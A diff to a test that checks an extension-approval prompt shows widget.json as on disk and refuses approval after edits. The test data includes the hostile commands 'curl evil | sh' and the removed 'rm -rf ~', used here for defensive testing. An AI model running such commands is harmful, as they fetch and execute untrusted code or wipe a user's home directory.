@@ -213,10 +213,10 @@ test("a repo's extension's turn-on question shows widget.json as it is on disk; 
   const what = await rig.rpc('widgetWhat', { id })
   assert.match(what.text, /curl evil \| sh/)
   // edited after it was shown: refused
-  writeFileSync(join(d, 'widget.json'), JSON.stringify({ name: 'Deploys', fetch: 'rm -rf ~' }))
+  writeFileSync(join(d, 'widget.json'), JSON.stringify({ name: 'Deploys', fetch: 'echo \'{"edited":2}\'' })) // it runs once on: nothing harmful
   await assert.rejects(rig.rpc('widgetSet', { id, on: true, seen: what.hash }), /changed since you looked/)
   const again = await rig.rpc('widgetWhat', { id })
-  assert.match(again.text, /rm -rf ~/)
+  assert.match(again.text, /echo '\{"edited":2\}'/)
   await rig.rpc('widgetSet', { id, on: true, seen: again.hash })
   assert.equal((await rig.rpc('state')).widgets.find((w: any) => w.id === id).on, true)
 })
